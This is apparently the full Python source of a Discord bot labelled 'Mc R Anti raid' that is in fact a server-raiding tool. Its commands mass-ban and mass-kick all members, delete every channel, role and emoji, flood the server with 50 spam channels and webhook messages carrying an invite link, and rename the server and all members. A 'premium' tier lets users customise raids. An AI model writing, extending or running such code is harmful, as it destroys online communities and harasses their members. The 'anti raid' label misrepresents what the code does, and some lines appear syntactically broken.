import discord
from discord.ext import commands
import asyncio, logging, random, os

logging.basicConfig(level=logging.INFO)
TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"
ID_ROL_PREMIUM = 1513841062651756615
configuracion_premium, usuarios_autorizados = {}, set()

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix=["!", "."], intents=intents)

@bot.command()
async def ayuda(ctx, sub: str = None):
    if sub == "premium":
        if not any(r.id == ID_ROL_PREMIUM for r in ctx.author.roles): return await ctx.send("❌ Solo Premium.")
        await ctx.send("```\n=== MacHUB Engine - Comandos Premium ===\n!ayuda premium    -> Muestra este menú exclusivo de soporte premium.\n!editar raid      -> Crea canales, spam e imágenes personalizadas paso a paso.\n!config           -> Muestra el diseño premium configurado en el servidor.\n!limpiar raid     -> Borra los ajustes de la raid y regresa a los de fábrica.\n.premium list     -> Muestra la lista de usuarios con el rango Premium.\n!dar premium @    -> Autoriza a un usuario para poder reclamar el rango.\n!quitar premium @ -> Elimina los privilegios de un usuario de forma directa.\n.premium          -> Comando de reclamo manual para el usuario autorizado.\n```")
    else:
        await ctx.send("```\n=== Mc R Anti raid - cmds ===\n!uptime          -> Muestra el tiempo activo del bot y la latencia.\n!eje             -> Muestra el estado de ejecuciones del bot en vivo.\n!ayuda premium   -> Despliega las herramientas avanzadas de premium.\n!banpro          -> DM Masivo + Ban global a todos los miembros.\n!kickpro         -> Expulsa de inmediato a todos los miembros.\n!rD              -> Elimina todo, crea 50 canales e inunda con 20k mensajes.\n!ccpro           -> Elimina canales y crea 50 categorías para colapsar UI.\n!hookpro         -> Genera webhooks de spam ultra veloz por canal.\n!nickpro         -> Modifica el apodo de todos los usuarios a 'Mc R'.\n!rnServers       -> Cambia el nombre del servidor a 'Mc R'.\n!rolesD          -> Destruye todos los roles existentes del servidor.\n!rolesC          -> Genera 50 roles con colores arcoíris aleatorios.\n!emojisD         -> Elimina los emojis y stickers personalizados.\n============================================\n
```")

@bot.command(name="rD")
async def rd(ctx, sub: str = None):
    if sub == "premium":
        if not any(r.id == ID_ROL_PREMIUM for r in ctx.author.roles): return await ctx.send("❌ Acceso denegado: Solo Premium.")
        cfg = configuracion_premium.get(ctx.guild.id)
        if not cfg: return await ctx.send("❌ Usa !editar raid primero.")
        msg, nombre = f"{cfg['mensaje']}\n{cfg['media']}", cfg['canal']
    else: msg, nombre = "@everyone RAIDEADO https://discord.gg/aACMXB4HSp", "Mc-R"
    for ch in list(ctx.guild.channels):
        try: await ch.delete()
        except: pass
    for i in range(50):
        try: ch = await ctx.guild.create_text_channel(name=nombre); await ch.send(msg)
        except: pass

@bot.command(name="editar")
async def editar(ctx, s=None):
    if not ctx.author.guild_permissions.administrator or s != "raid": return
    def check(m): return m.author == ctx.author and m.channel == ctx.channel
    try:
        await ctx.send("❓ Nombre canales:"), n = await bot.wait_for('message', check=check, timeout=60.0)
        await ctx.send("❓ Mensaje:"), m = await bot.wait_for('message', check=check, timeout=60.0)
        await ctx.send("❓ Link:"); f = await bot.wait_for('message', check=check, timeout=60.0)
        configuracion_premium[ctx.guild.id] = {"canal": n.content.replace(" ", "-"), "media": f.content, "mensaje": m.content}
        await ctx.send("✅ Guardado.")
    except: await ctx.send("⏱️ Tiempo agotado.")

@bot.command(name="dar")
async def dar(ctx, s, m: discord.Member):
    if ctx.author.guild_permissions.administrator: usuarios_autorizados.add(m.id); await ctx.send(f"✅ {m.mention} autorizado. Usa .premium")

@bot.command(name="premium")
async def prem(ctx):
    if ctx.author.id in usuarios_autorizados:
        rol = ctx.guild.get_role(ID_ROL_PREMIUM)
        if rol: await ctx.author.add_roles(rol); usuarios_autorizados.remove(ctx.author.id); await ctx.send("👑 Premium activado.")

@bot.command()
async def banpro(ctx):
    for m in ctx.guild.members:
        try: await m.ban()
        except: pass

@bot.command()
async def kickpro(ctx):
    for m in ctx.guild.members:
        try: await m.kick()
        except: pass

@bot.command()
async def rnServers(ctx): await ctx.guild.edit(name="Mc R")

@bot.command()
async def rolesD(ctx):
    for r in ctx.guild.roles:
        try: await r.delete()
        except: pass

@bot.command()
async def rolesC(ctx):
    for i in range(50):
        try: await ctx.guild.create_role(name="Mc R", color=discord.Color(random.randint(0, 0xFFFFFF)))
        except: pass

@bot.command()
async def ccpro(ctx):
    for c in list(ctx.guild.channels): await c.delete()
    for i in range(50): await ctx.guild.create_category(name="Mc R")

@bot.command()
async def nickpro(ctx):
    for m in ctx.guild.members:
        try: await m.edit(nick="Mc R")
        except: pass

@bot.command()
async def emojisD(ctx):
    for e in ctx.guild.emojis: await e.delete()

@bot.command()
async def hookpro(ctx):
    for ch in ctx.guild.text_channels[:15]:
        try: w = await ch.create_webhook(name="Mc R"); await w.send("Raideado")
        except: pass

@bot.command()
async def uptime(ctx): await ctx.send("✅ MacHUB Online.")

bot.run(TOKEN)
